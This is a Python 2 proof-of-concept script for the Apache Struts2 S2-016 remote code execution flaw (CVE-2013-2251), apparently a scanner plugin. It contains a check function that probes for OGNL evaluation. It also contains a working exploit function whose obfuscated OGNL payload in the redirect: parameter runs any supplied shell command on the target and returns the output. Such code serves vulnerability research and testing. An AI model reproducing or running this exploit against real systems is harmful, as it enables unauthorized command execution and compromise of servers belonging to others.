#!/usr/bin/env python
#-*- coding:utf-8 -*-
# author = S4kur4
_type = 'RCE'
"""
Struts2 S2-016 Remote Code Execution PoC (CVE-2013-2251)

Version:
2.0.0-2.3.15
"""

import requests
import random

header = {
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Connection" : "keep-alive",
    "Accept" : "*/*",
    "Accept-Encoding" : "deflate",
    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"
    }

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    try:
        a = random.randint(1000, 2000)
        b = random.randint(1000, 2000)
        c = a + b
        url = url + "?redirect:%25{" + "%s}" % str(a+b)
        response = requests.get(url=url, headers=header, timeout=5)
        if str(c) in response.text:
            return True
        else:
            return False
    except Exception:
        return False
    
def exp(url, command):
    url = url + "?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27"+command+"%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}"
    response = requests.get(url=url, headers=header, timeout=5)
    print response.text.rstrip()